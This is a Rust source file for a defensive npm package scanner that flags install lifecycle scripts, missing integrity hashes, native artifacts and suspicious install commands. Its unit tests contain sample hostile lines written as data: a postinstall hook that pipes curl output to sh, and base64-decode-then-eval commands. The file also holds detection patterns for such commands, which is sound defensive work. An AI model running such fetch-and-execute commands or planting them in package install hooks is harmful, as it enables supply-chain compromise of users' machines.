use std::{collections::BTreeMap, fmt};

use serde::{Deserialize, Serialize};

pub const HIGH_DEPENDENCY_COUNT: usize = 75;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ScanSeverity {
    Info,
    Warn,
    Deny,
}

impl fmt::Display for ScanSeverity {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        let value = match self {
            Self::Info => "info",
            Self::Warn => "warn",
            Self::Deny => "deny",
        };
        formatter.write_str(value)
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum ScanCategory {
    DependencyCount,
    LifecycleScript,
    MissingIntegrity,
    NativeArtifact,
    NativePackageName,
    ShellScript,
    SuspiciousInstallCommand,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ScanFinding {
    pub severity: ScanSeverity,
    pub category: ScanCategory,
    pub message: String,
}

impl ScanFinding {
    pub fn new(severity: ScanSeverity, category: ScanCategory, message: impl Into<String>) -> Self {
        Self {
            severity,
            category,
            message: message.into(),
        }
    }

    pub fn warning_line(&self) -> String {
        format!("{}: {}", self.severity, self.message)
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ScanReport {
    pub findings: Vec<ScanFinding>,
}

impl ScanReport {
    pub fn new(mut findings: Vec<ScanFinding>) -> Self {
        findings.sort_by(|left, right| {
            right
                .severity
                .cmp(&left.severity)
                .then_with(|| left.category.cmp(&right.category))
                .then_with(|| left.message.cmp(&right.message))
        });
        findings.dedup_by(|left, right| {
            left.severity == right.severity
                && left.category == right.category
                && left.message == right.message
        });

        Self { findings }
    }

    pub fn highest_severity(&self) -> Option<ScanSeverity> {
        self.findings.iter().map(|finding| finding.severity).max()
    }

    pub fn warning_lines(&self) -> Vec<String> {
        self.findings
            .iter()
            .filter(|finding| finding.severity != ScanSeverity::Info)
            .map(ScanFinding::warning_line)
            .collect()
    }

    pub fn has_deny_findings(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity == ScanSeverity::Deny)
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct NpmPackageScanInput {
    pub name: String,
    pub version: String,
    pub integrity: Option<String>,
    pub scripts: BTreeMap<String, String>,
    pub dependency_count: usize,
    pub optional_dependency_count: usize,
    pub peer_dependency_count: usize,
    pub file_summaries: Vec<TarballFileSummary>,
}

impl NpmPackageScanInput {
    pub fn new(name: impl Into<String>, version: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            version: version.into(),
            ..Self::default()
        }
    }

    pub fn total_dependency_count(&self) -> usize {
        self.dependency_count + self.optional_dependency_count + self.peer_dependency_count
    }

    fn label(&self) -> String {
        format!("{}@{}", self.name, self.version)
    }
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TarballFileSummary {
    pub path: String,
    pub size_bytes: Option<u64>,
    pub executable: bool,
    pub first_line: Option<String>,
}

impl TarballFileSummary {
    pub fn new(path: impl Into<String>) -> Self {
        Self {
            path: path.into(),
            ..Self::default()
        }
    }
}

pub fn scan_npm_package(input: &NpmPackageScanInput) -> ScanReport {
    let mut findings = Vec::new();
    let label = input.label();

    if input
        .integrity
        .as_deref()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .is_none()
    {
        findings.push(ScanFinding::new(
            ScanSeverity::Warn,
            ScanCategory::MissingIntegrity,
            format!("`{label}` does not expose an npm integrity hash"),
        ));
    }

    let lifecycle_scripts = lifecycle_script_names(&input.scripts);
    if !lifecycle_scripts.is_empty() {
        findings.push(ScanFinding::new(
            ScanSeverity::Warn,
            ScanCategory::LifecycleScript,
            format!(
                "`{label}` declares install lifecycle scripts: {}",
                lifecycle_scripts.join(", ")
            ),
        ));
    }

    let suspicious_scripts = suspicious_script_names(&input.scripts);
    if !suspicious_scripts.is_empty() {
        findings.push(ScanFinding::new(
            ScanSeverity::Deny,
            ScanCategory::SuspiciousInstallCommand,
            format!(
                "`{label}` declares suspicious script commands: {}",
                suspicious_scripts.join(", ")
            ),
        ));
    }

    let total_dependencies = input.total_dependency_count();
    if total_dependencies >= HIGH_DEPENDENCY_COUNT {
        findings.push(ScanFinding::new(
            ScanSeverity::Warn,
            ScanCategory::DependencyCount,
            format!("`{label}` has a large dependency surface: {total_dependencies} packages"),
        ));
    }

    if looks_native_package_name(&input.name) {
        findings.push(ScanFinding::new(
            ScanSeverity::Warn,
            ScanCategory::NativePackageName,
            format!("`{label}` has a native or platform-specific package name"),
        ));
    }

    let native_files = matching_file_examples(&input.file_summaries, looks_native_file);
    if !native_files.is_empty() {
        findings.push(ScanFinding::new(
            ScanSeverity::Warn,
            ScanCategory::NativeArtifact,
            format!(
                "`{label}` includes native-looking artifacts: {}",
                native_files.join(", ")
            ),
        ));
    }

    let shell_files = matching_file_examples(&input.file_summaries, looks_shell_script_file);
    if !shell_files.is_empty() {
        findings.push(ScanFinding::new(
            ScanSeverity::Warn,
            ScanCategory::ShellScript,
            format!(
                "`{label}` includes shell scripts: {}",
                shell_files.join(", ")
            ),
        ));
    }

    ScanReport::new(findings)
}

pub fn looks_suspicious_install_command(command: &str) -> bool {
    has_network_fetch_piped_to_shell(command) || has_base64_decode_eval(command)
}

fn lifecycle_script_names(scripts: &BTreeMap<String, String>) -> Vec<String> {
    const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];

    LIFECYCLE_SCRIPTS
        .iter()
        .filter(|script| scripts.contains_key(**script))
        .map(|script| (*script).to_string())
        .collect()
}

fn suspicious_script_names(scripts: &BTreeMap<String, String>) -> Vec<String> {
    scripts
        .iter()
        .filter(|(name, command)| {
            matches!(name.as_str(), "preinstall" | "install" | "postinstall")
                && looks_suspicious_install_command(command)
        })
        .map(|(name, _)| name.clone())
        .collect()
}

fn matching_file_examples(
    files: &[TarballFileSummary],
    predicate: fn(&TarballFileSummary) -> bool,
) -> Vec<String> {
    let mut examples: Vec<_> = files
        .iter()
        .filter(|file| predicate(file))
        .map(|file| file.path.clone())
        .take(3)
        .collect();

    if files.iter().filter(|file| predicate(file)).count() > examples.len() {
        examples.push("...".to_string());
    }

    examples
}

fn looks_native_package_name(name: &str) -> bool {
    let tokens = name_tokens(name);

    if tokens.iter().any(|token| {
        matches!(
            token.as_str(),
            "ffi" | "napi" | "native" | "neon" | "prebuild" | "prebuildify"
        )
    }) {
        return true;
    }

    let has_node_gyp =
        tokens.iter().any(|token| token == "node") && tokens.iter().any(|token| token == "gyp");
    if has_node_gyp {
        return true;
    }

    let has_platform = tokens.iter().any(|token| {
        matches!(
            token.as_str(),
            "aix"
                | "android"
                | "darwin"
                | "freebsd"
                | "gnu"
                | "linux"
                | "musl"
                | "openbsd"
                | "win32"
                | "windows"
        )
    });
    let has_arch = tokens.iter().any(|token| {
        matches!(
            token.as_str(),
            "arm" | "arm64" | "ia32" | "x64" | "x86" | "x86_64"
        )
    });

    has_platform && has_arch
}

fn looks_native_file(file: &TarballFileSummary) -> bool {
    let path = file.path.to_ascii_lowercase();
    [
        ".node", ".so", ".dylib", ".dll", ".exe", ".a", ".wasm", ".o",
    ]
    .iter()
    .any(|extension| path.ends_with(extension))
}

fn looks_shell_script_file(file: &TarballFileSummary) -> bool {
    let path = file.path.to_ascii_lowercase();
    if [".sh", ".bash", ".zsh", ".fish"]
        .iter()
        .any(|extension| path.ends_with(extension))
    {
        return true;
    }

    file.first_line
        .as_deref()
        .map(str::trim)
        .map(|line| {
            line.starts_with("#!")
                && [" sh", "/sh", "bash", "zsh", "fish"]
                    .iter()
                    .any(|marker| line.contains(marker))
        })
        .unwrap_or(false)
}

fn has_network_fetch_piped_to_shell(command: &str) -> bool {
    let lowered = command.to_ascii_lowercase();
    let segments: Vec<_> = lowered.split('|').collect();

    if segments.len() < 2 {
        return false;
    }

    for (index, segment) in segments.iter().enumerate().take(segments.len() - 1) {
        if !(contains_word(segment, "curl") || contains_word(segment, "wget")) {
            continue;
        }

        if segments[index + 1..].iter().any(|segment| {
            contains_word(segment, "sh")
                || contains_word(segment, "bash")
                || contains_word(segment, "zsh")
                || contains_word(segment, "fish")
        }) {
            return true;
        }
    }

    false
}

fn has_base64_decode_eval(command: &str) -> bool {
    let lowered = command.to_ascii_lowercase();
    if !contains_word(&lowered, "base64") {
        return false;
    }

    let decodes = lowered.contains("--decode")
        || lowered.contains(" -d")
        || lowered.contains("\t-d")
        || lowered.contains(" -di")
        || lowered.contains(" -id");
    if !decodes {
        return false;
    }

    contains_word(&lowered, "eval")
        || has_decode_pipe_to_shell(&lowered)
        || contains_word(&lowered, "bash")
        || contains_word(&lowered, "sh")
}

fn has_decode_pipe_to_shell(command: &str) -> bool {
    let segments: Vec<_> = command.split('|').collect();

    for (index, segment) in segments
        .iter()
        .enumerate()
        .take(segments.len().saturating_sub(1))
    {
        if contains_word(segment, "base64")
            && (segment.contains("--decode") || segment.contains(" -d"))
            && segments[index + 1..]
                .iter()
                .any(|tail| contains_word(tail, "sh") || contains_word(tail, "bash"))
        {
            return true;
        }
    }

    false
}

fn contains_word(text: &str, word: &str) -> bool {
    text.split(|character: char| {
        !(character.is_ascii_alphanumeric() || character == '_' || character == '-')
    })
    .any(|token| token == word)
}

fn name_tokens(name: &str) -> Vec<String> {
    name.to_ascii_lowercase()
        .split(|character: char| !(character.is_ascii_alphanumeric() || character == '_'))
        .filter(|token| !token.is_empty())
        .map(ToString::to_string)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::{
        HIGH_DEPENDENCY_COUNT, NpmPackageScanInput, ScanCategory, ScanSeverity, TarballFileSummary,
        looks_suspicious_install_command, scan_npm_package,
    };

    #[test]
    fn reports_lifecycle_scripts_and_missing_integrity() {
        let mut input = NpmPackageScanInput::new("demo", "1.0.0");
        input
            .scripts
            .insert("postinstall".to_string(), "node install.js".to_string());

        let report = scan_npm_package(&input);
        let warnings = report.warning_lines();

        assert_eq!(report.highest_severity(), Some(ScanSeverity::Warn));
        assert!(warnings.iter().any(|line| line.contains("integrity hash")));
        assert!(
            warnings
                .iter()
                .any(|line| line.contains("install lifecycle scripts: postinstall"))
        );
    }

    #[test]
    fn prepare_script_is_not_registry_install_lifecycle() {
        let mut input = NpmPackageScanInput::new("demo", "1.0.0");
        input.integrity = Some("sha512-example".to_string());
        input
            .scripts
            .insert("prepare".to_string(), "rollup -c".to_string());

        let report = scan_npm_package(&input);

        assert!(report.findings.is_empty());
    }

    #[test]
    fn suspicious_non_lifecycle_scripts_are_not_execution_denials() {
        let mut input = NpmPackageScanInput::new("demo", "1.0.0");
        input.integrity = Some("sha512-example".to_string());
        input.scripts.insert(
            "manual-download".to_string(),
            "curl https://example.invalid/install.sh | sh".to_string(),
        );

        let report = scan_npm_package(&input);

        assert!(!report.has_deny_findings());
    }

    #[test]
    fn suspicious_fetch_pipe_shell_commands_are_deny_findings() {
        let mut input = NpmPackageScanInput::new("bad", "9.9.9");
        input.integrity = Some("sha512-example".to_string());
        input.scripts.insert(
            "postinstall".to_string(),
            "curl -fsSL https://example.invalid/install.sh | sh".to_string(),
        );

        let report = scan_npm_package(&input);

        assert!(report.has_deny_findings());
        assert!(report.findings.iter().any(|finding| {
            finding.category == ScanCategory::SuspiciousInstallCommand
                && finding.message.contains("postinstall")
        }));
    }

    #[test]
    fn suspicious_base64_eval_commands_are_deny_findings() {
        assert!(looks_suspicious_install_command(
            "eval \"$(echo ZWNobyBoaQ== | base64 -d)\""
        ));
        assert!(looks_suspicious_install_command(
            "echo ZWNobyBoaQ== | base64 --decode | bash"
        ));
    }

    #[test]
    fn high_dependency_count_is_warned() {
        let mut input = NpmPackageScanInput::new("large-tool", "2.0.0");
        input.integrity = Some("sha512-example".to_string());
        input.dependency_count = HIGH_DEPENDENCY_COUNT;

        let report = scan_npm_package(&input);

        assert_eq!(report.highest_severity(), Some(ScanSeverity::Warn));
        assert!(report.findings.iter().any(|finding| {
            finding.category == ScanCategory::DependencyCount
                && finding.message.contains(&HIGH_DEPENDENCY_COUNT.to_string())
        }));
    }

    #[test]
    fn native_package_names_and_files_are_warned() {
        let mut input = NpmPackageScanInput::new("@rollup/rollup-linux-x64-gnu", "4.0.0");
        input.integrity = Some("sha512-example".to_string());
        input.file_summaries = vec![
            TarballFileSummary::new("package/rollup.linux-x64-gnu.node"),
            TarballFileSummary::new("package/vendor/libhelper.so"),
        ];

        let report = scan_npm_package(&input);

        assert!(report.findings.iter().any(|finding| {
            finding.category == ScanCategory::NativePackageName
                && finding.message.contains("platform-specific")
        }));
        assert!(report.findings.iter().any(|finding| {
            finding.category == ScanCategory::NativeArtifact && finding.message.contains(".node")
        }));
    }

    #[test]
    fn shell_script_files_are_warned() {
        let mut input = NpmPackageScanInput::new("shell-tool", "1.0.0");
        input.integrity = Some("sha512-example".to_string());
        input.file_summaries = vec![
            TarballFileSummary::new("package/scripts/bootstrap.sh"),
            TarballFileSummary {
                path: "package/bin/tool".to_string(),
                size_bytes: None,
                executable: true,
                first_line: Some("#!/usr/bin/env bash".to_string()),
            },
        ];

        let report = scan_npm_package(&input);

        assert!(report.findings.iter().any(|finding| {
            finding.category == ScanCategory::ShellScript
                && finding.message.contains("bootstrap.sh")
        }));
    }

    #[test]
    fn clean_metadata_has_no_warning_lines() {
        let mut input = NpmPackageScanInput::new("tiny-tool", "1.0.0");
        input.integrity = Some("sha512-example".to_string());
        input.dependency_count = 2;

        let report = scan_npm_package(&input);

        assert!(report.findings.is_empty());
        assert!(report.warning_lines().is_empty());
    }
}
